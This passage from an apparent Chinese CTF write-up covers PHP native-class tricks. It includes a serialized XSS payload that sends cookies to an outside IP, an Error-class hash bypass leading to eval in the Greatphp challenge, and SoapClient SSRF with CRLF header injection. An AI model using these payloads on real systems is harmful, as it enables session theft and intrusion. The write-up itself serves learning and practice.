</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;&lt;script&gt;window.open(&#39;http://27.25.151.48:9999/&#39;+document.cookie)&lt;/script&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>?</span><span class=nx>yds</span><span class=p>[</span><span class=nx>is_so_beautiful</span><span class=o>=</span><span class=nx>O</span><span class=o>%</span><span class=mi>3</span><span class=nx>A9</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=nx>Exception</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>A7</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>7</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A10</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>2</span><span class=nx>A</span><span class=o>%</span><span class=mo>00</span><span class=nx>message</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A73</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Cscript</span><span class=o>%</span><span class=mi>3</span><span class=nx>Ewindow</span><span class=o>.</span><span class=nx>open</span><span class=o>%</span><span class=mi>28</span><span class=o>%</span><span class=mi>27</span><span class=nx>http</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>2</span><span class=nx>F</span><span class=o>%</span><span class=mi>2</span><span class=nx>F27</span><span class=o>.</span><span class=mf>25.151</span><span class=o>.</span><span class=mi>48</span><span class=o>%</span><span class=mi>3</span><span class=nx>A9999</span><span class=o>%</span><span class=mi>2</span><span class=nx>F</span><span class=o>%</span><span class=mi>27</span><span class=o>%</span><span class=mi>2</span><span class=nx>Bdocument</span><span class=o>.</span><span class=nx>cookie</span><span class=o>%</span><span class=mi>29</span><span class=o>%</span><span class=mi>3</span><span class=nx>C</span><span class=o>%</span><span class=mi>2</span><span class=nx>Fscript</span><span class=o>%</span><span class=mi>3</span><span class=nx>E</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A17</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=nx>Exception</span><span class=o>%</span><span class=mo>00</span><span class=nx>string</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A0</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A7</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>2</span><span class=nx>A</span><span class=o>%</span><span class=mo>00</span><span class=nx>code</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bi</span><span class=o>%</span><span class=mi>3</span><span class=nx>A0</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A7</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>2</span><span class=nx>A</span><span class=o>%</span><span class=mo>00</span><span class=nx>file</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A54</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=nx>C</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>5</span><span class=nx>CUsers</span><span class=o>%</span><span class=mi>5</span><span class=nx>Cbaozhongqi</span><span class=o>%</span><span class=mi>5</span><span class=nx>CDocuments</span><span class=o>%</span><span class=mi>5</span><span class=nx>CVSCODE</span><span class=o>%</span><span class=mi>5</span><span class=nx>C</span><span class=o>.</span><span class=nx>vscode</span><span class=o>%</span><span class=mi>5</span><span class=nx>Cphp</span><span class=o>%</span><span class=mi>5</span><span class=nx>C1</span><span class=o>.</span><span class=nx>php</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A7</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=o>%</span><span class=mi>2</span><span class=nx>A</span><span class=o>%</span><span class=mo>00</span><span class=nx>line</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bi</span><span class=o>%</span><span class=mi>3</span><span class=nx>A2</span><span class=o>%</span><span class=mi>3</span><span class=nx>Bs</span><span class=o>%</span><span class=mi>3</span><span class=nx>A16</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=nx>Exception</span><span class=o>%</span><span class=mo>00</span><span class=nx>trace</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>Ba</span><span class=o>%</span><span class=mi>3</span><span class=nx>A0</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>7</span><span class=nx>B</span><span class=o>%</span><span class=mi>7</span><span class=nx>Ds</span><span class=o>%</span><span class=mi>3</span><span class=nx>A19</span><span class=o>%</span><span class=mi>3</span><span class=nx>A</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mo>00</span><span class=nx>Exception</span><span class=o>%</span><span class=mo>00</span><span class=nx>previous</span><span class=o>%</span><span class=mi>22</span><span class=o>%</span><span class=mi>3</span><span class=nx>BN</span><span class=o>%</span><span class=mi>3</span><span class=nx>B</span><span class=o>%</span><span class=mi>7</span><span class=nx>D</span>
</span></span></code></pre></td></tr></table></div></div><p>成功拿到<code>flag</code>,我想着要是还拿不到的话就直接打源码了，但是所幸拿到了</p><h3 id=绕过hash>绕过hash</h3><h4 id=errorexception-1>Error/Exception</h4><p><strong>Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。</strong></p><p>利用类的<code>__toString()</code>抛出错误，返回数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$str</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>// Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:3
</span></span></span><span class=line><span class=cl><span class=c1>// Stack trace:
</span></span></span><span class=line><span class=cl><span class=c1>// #0 {main}Error: baozongwi in C:\Users\baozhongqi\Documents\VSCODE\php\index.php:4
</span></span></span><span class=line><span class=cl><span class=c1>// Stack trace:
</span></span></span><span class=line><span class=cl><span class=c1>// #0 {main}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里当我们写在不同行的时候发现并不等，但是如果我们写在同一行中</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$str</span><span class=o>=</span><span class=s1>&#39;baozongwi&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=p>(</span><span class=nv>$a</span> <span class=o>!=</span> <span class=nv>$b</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>sha1</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span><span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$b</span><span class=p>))</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$a</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>Error</span><span class=o>:</span> <span class=nx>baozongwi</span> <span class=nx>in</span> <span class=nx>C</span><span class=o>:</span><span class=nx>\Users\baozhongqi\Documents\VSCODE\php\caogao</span><span class=o>.</span><span class=nx>php</span><span class=o>:</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=nx>Stack</span> <span class=nx>trace</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=c1>#0 {main}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>Error</span><span class=o>:</span> <span class=nx>baozongwi</span> <span class=nx>in</span> <span class=nx>C</span><span class=o>:</span><span class=nx>\Users\baozhongqi\Documents\VSCODE\php\caogao</span><span class=o>.</span><span class=nx>php</span><span class=o>:</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=nx>Stack</span> <span class=nx>trace</span><span class=o>:</span>
</span></span><span class=line><span class=cl><span class=c1>#0 {main}
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>深究其本质，当我们对一个对象调用 <code>md5()</code> 或 <code>sha1()</code> 时，PHP 会将对象序列化成字符串，并基于该字符串计算哈希值。但是由于 <code>Error</code> 类在实现字符串化方法（<code>__toString</code>）时，可能只是返回对象的错误消息 <code>message</code> 属性，而忽略了 <code>code</code> 等其他属性。</p></blockquote><p>所以直接比较的话没有忽略属性，是不等的，而哈希比较的话是相等的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s1>&#39;baozongwi&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span><span class=nv>$b</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s1>&#39;baozongwi&#39;</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$a</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span> 
</span></span></code></pre></td></tr></table></div></div><p>那么来个demo</p><p><strong>[极客大挑战 2020]Greatphp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SYCLOVER</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$syc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lover</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>syc</span> <span class=o>!=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lover</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>syc</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lover</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nx>sha1</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>syc</span><span class=p>)</span><span class=o>===</span> <span class=nx>sha1</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>lover</span><span class=p>))</span> <span class=p>){</span>
</span></span><span class=line><span class=cl>           <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/\&lt;\?php|\(|\)|</span><span class=se>\&#34;</span><span class=s2>|\&#39;/&#34;</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>syc</span><span class=p>,</span> <span class=nv>$match</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>               <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>syc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>           <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>               <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Try Hard !!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>           <span class=p>}</span>
</span></span><span class=line><span class=cl>           
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;great&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;great&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>md5好绕过了，取反得到<code>flag</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=o>~</span><span class=s1>&#39;/flag&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>SYCLOVER</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$syc</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$lover</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$str</span><span class=o>=</span><span class=s2>&#34;?&gt;&lt;?=include~&#34;</span><span class=o>.</span><span class=nx>urldecode</span><span class=p>(</span><span class=s2>&#34;%d0%99%93%9e%98&#34;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;?&gt;&lt;?&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span><span class=nv>$b</span><span class=o>=</span><span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=nv>$str</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>new</span> <span class=nx>SYCLOVER</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>syc</span> <span class=o>=</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>lover</span> <span class=o>=</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$c</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这里的绕过hash知识使用<code>Exception</code>也是同样能够达到目的的</p><h3 id=ssrf>ssrf</h3><h4 id=soapclient>SoapClient</h4><blockquote><p>SoapClient 是一个专门用来访问web服务的类，可以提供一个基于<a class=link href="https://so.csdn.net/so/search?q=SOAP&amp;spm=1001.2101.3001.7020" target=_blank rel=noopener>SOAP</a>协议访问Web服务的 PHP 客户端。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而<code>__call</code>触发很简单，就是当对象访问不存在的方法的时候就会触发。</p></blockquote><p>该类的构造函数如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public SoapClient :: SoapClient(mixed $wsdl [，array $options ])
</span></span></code></pre></td></tr></table></div></div><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>但是要知道的是既然我们是打<code>ssrf</code>，那么<code>wsdl</code>肯定是不开的</p><p>随便写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;http://27.25.151.48:2333/aaa&#39;</span><span class=p>,</span> <span class=s1>&#39;uri&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;http://27.25.151.48:2333&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>();</span>    
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>但是这样子的话利用效果仍然不大，仅仅只是触发恶意文件进行读取,但是如果还存在crlf漏洞的话，我们就可以插入HTTP头</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$target</span> <span class=o>=</span> <span class=s1>&#39;http://ip:2333/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>SoapClient</span><span class=p>(</span><span class=k>null</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;location&#39;</span> <span class=o>=&gt;</span> <span class=nv>$target</span><span class=p>,</span> <span class=s1>&#39;user_agent&#39;</span> <span class=o>=&gt;</span> <span class=s2>&#34;WHOAMI</span><span class=se>\r\n</span><span class=s2>Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&#34;</span><span class=p>,</span> <span class=s1>&#39;uri&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;test&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$b</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$b</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>-&gt;</span><span class=na>a</span><span class=p>();</span>    
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# nc -lvnp 2333
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 2333
</span></span><span class=line><span class=cl>Connection received on ip 39598
</span></span><span class=line><span class=cl>POST /aaa HTTP/1.1
</span></span><span class=line><span class=cl>Host: ip:2333
</span></span><span class=line><span class=cl>Connection: Keep-Alive
</span></span><span class=line><span class=cl>User-Agent: WHOAMI
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4
</span></span><span class=line><span class=cl>Content-Type: text/xml; charset=utf-8
</span></span><span class=line><span class=cl>SOAPAction: &#34;http://27.25.151.48:2333#a&#34;
</span></span><span class=line><span class=cl>Content-Length: 385
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class=line><span class=cl>&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:ns1=&#34;http://27.25.151.48:2333&#34; xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:SOAP-ENC=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34; SOAP-ENV:encodingStyle=&#34;http://schemas.xmlsoap.org/soap/encoding/&#34;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;
</span></span></code></pre></td></tr></table></div></div><p>也是看到成功插入了，那么来看几个<code>demo</code></p><p><strong>ctfshow web入门 web259</strong></p><p>flag.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
